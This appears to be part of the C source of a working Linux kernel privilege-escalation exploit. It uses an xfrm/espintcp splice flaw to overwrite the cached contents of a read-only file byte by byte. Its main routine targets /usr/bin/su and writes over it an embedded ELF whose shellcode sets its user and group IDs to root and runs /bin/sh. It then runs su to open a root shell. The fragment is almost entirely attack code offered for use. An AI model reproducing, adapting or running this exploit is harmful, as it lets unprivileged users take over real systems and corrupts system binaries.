	printf(C_BCYN "\n[*]" C_RESET
	       " timing: rx_pre_ulp=%uus tx_pre_splice=%uus rx_post_ulp=%uus\n",
	       RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
	printf(C_BCYN "[*]" C_RESET
	       " range: offset=0x%llx len=%zu last=0x%llx"
	       " enc_len=%d splice_len=%d\n",
	       (unsigned long long)byte_off, desired_len,
	       (unsigned long long)last, ESP_GCM_ENCRYPTED_LEN, FRAG_LEN);
	printf(C_BCYN "[*]" C_RESET
	       " union: transformed=0x%llx-0x%llx"
	       " collateral_after=0x%llx-0x%llx\n",
	       (unsigned long long)byte_off,
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1),
	       (unsigned long long)(last + 1),
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1));
	printf(C_BCYN "[*]" C_RESET " ");
	print_hex_bytes("payload", desired, desired_len);
	printf("\n");

	build_stream0_table();
	printf("\n");

	/* seed live_state from the file so the hex dump has real values */
	fd_init = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd_init < 0) die("open live_state init");
	if (pread(fd_init, live_state, desired_len, (off_t)byte_off) < (ssize_t)desired_len)
		die("pread live_state init");
	close(fd_init);

	/* clear screen so the frame starts at a known row 1 */
	printf("\033[2J\033[H");
	draw_smash_frame(desired, desired_len, live_state, 0, 0, 0, 1);

	/* pin the frame to rows 1-FRAME_LINES; scroll region below */
	{
		struct winsize ws;
		int tr = 40;
		if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_row > FRAME_LINES)
			tr = (int)ws.ws_row;
		printf("\033[%d;%dr", FRAME_LINES + 1, tr);
		printf("\033[%d;1H", tr);  /* park cursor at bottom of scroll region */
		fflush(stdout);
	}

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current, final, need_stream;

		live_state[idx] = read_byte_at(target_file, off);
		current = live_state[idx];

		draw_smash_frame(desired, desired_len, live_state, idx,
				 changed, skipped, 0);

		if (current == desired[idx]) {
			printf(C_DIM "[-] [%zu/%zu] +%04llx already=%02x skip\n" C_RESET,
			       idx + 1, desired_len, (unsigned long long)off, current);
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		printf(C_BCYN "[*]" C_RESET " [%zu/%zu]"
		       " +%04llx  " C_RED "%02x" C_RESET " -> " C_BGRN "%02x" C_RESET
		       "  xor=" C_CYAN "%02x" C_RESET
		       " seq=" C_DIM "%u" C_RESET
		       " nonce=" C_DIM "%u" C_RESET "\n",
		       idx + 1, desired_len, (unsigned long long)off,
		       current, desired[idx], need_stream,
		       active_esp_seq, stream0_nonce[need_stream]);

/*
		printf(C_BCYN "[*]" C_RESET " before:\n");
		print_hex_row(target_file, off, "orig", current, "want", desired[idx]);

		printf(C_BCYN "[*]" C_RESET " iv=" C_CYAN);
		{
			size_t k;
			for (k = 0; k < sizeof(active_esp_gcm_iv); k++)
				printf("%02x", active_esp_gcm_iv[k]);
		}
*/
		printf(C_RESET " firing espintcp splice...\n");

		if (run_trigger_pair() < 0) {
			fprintf(stderr, C_BRED "[-] trigger pair failed at index=%zu\n" C_RESET, idx);
			return 2;
		}

		final = read_byte_at(target_file, off);
		live_state[idx] = final;

/*
		printf(C_BCYN "[*]" C_RESET " after:\n");
		print_hex_row(target_file, off, "was", current, "now", final);
*/
		if (final == desired[idx]) {
			printf(C_BGRN "[+]" C_RESET " smashed"
			       C_DIM " %02x -> %02x  index=%zu offset=+%04llx\n\n" C_RESET,
			       current, final, idx, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final == current) {
			printf(C_BGRN "[-]" C_RESET
			       " fixed behavior: byte unchanged at index=%zu offset=%llu\n",
			       idx, (unsigned long long)off);
			return 0;
		}
		printf(C_BRED "[-]" C_RESET
		       " BUG: byte changed but desired-value check mismatched"
		       " index=%zu offset=%llu desired=%02x got=%02x\n",
		       idx, (unsigned long long)off, desired[idx], final);
		return 1;
	}

	/* final frame: all bytes done, cursor past the end */
	draw_smash_frame(desired, desired_len, live_state, desired_len,
			 changed, skipped, 0);

	/* restore full scroll region and drop cursor below the frame */
	printf("\033[r\033[%d;1H\n", FRAME_LINES + 1);

	/* final verify pass */
	printf(C_BCYN "[*]" C_RESET " verifying %zu bytes...\n", desired_len);
	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char final = read_byte_at(target_file, off);

		if (final != desired[idx]) {
			printf(C_BRED "[-]" C_RESET
			       " BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x\n",
			       idx, (unsigned long long)off, desired[idx], final);
			return 1;
		}
	}

	printf(C_BCYN "[*]" C_RESET " bytes_flip_summary len=%zu changed=" C_BGRN "%zu" C_RESET
	       " skipped=" C_DIM "%zu" C_RESET "\n",
	       desired_len, changed, skipped);
	if (changed == 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}

	printf(C_BGRN "[+]" C_RESET " BUG: changed requested copied byte range to desired values\n");
	return 1;
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s <target-file> <offset> <hex-bytes>\n", prog);
	fprintf(stderr, "example: %s /path/to/target 0 42434445\n", prog);
}

static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

int main(int argc, char **argv)
{
	unsigned char *desired;
	uint64_t file_size, byte_off;
	size_t desired_len, sample_len;
	int ret;


	setvbuf(stdout, NULL, _IONBF, 0);

	printf(C_BCYN "[*]" C_RESET
	       " uid=" C_BWHT "%d" C_RESET
	       " euid=" C_BWHT "%d" C_RESET
	       " gid=" C_BWHT "%d" C_RESET
	       " egid=" C_BWHT "%d" C_RESET "\n",
	       getuid(), geteuid(), getgid(), getegid());
	printf(C_BCYN "[*]" C_RESET
	       " mode=xfrm_espintcp_pagecache_replace collateral=after\n");
	printf("\n");

//        system("cp /bin/cat /tmp/test");
//        file_size = use_existing_target("/tmp/test");
        file_size = use_existing_target("/usr/bin/su");
	byte_off = 0;
	desired = (unsigned char *)shell_elf;
	desired_len = PAYLOAD_LEN;

	printf(C_BCYN "[*]" C_RESET " target=%s size=%llu\n",
	       target_file, (unsigned long long)file_size);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns_root_mapped_to_outer_user");

	ret = replace_existing_bytes_after(byte_off, desired, desired_len,
					   file_size);
	/* reset scroll region; some terminals home the cursor on \033[r so
	 * explicitly jump to the last row so PS1 lands below our output */
	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
	execve("/usr/bin/su", NULL, NULL);
	return ret;
}
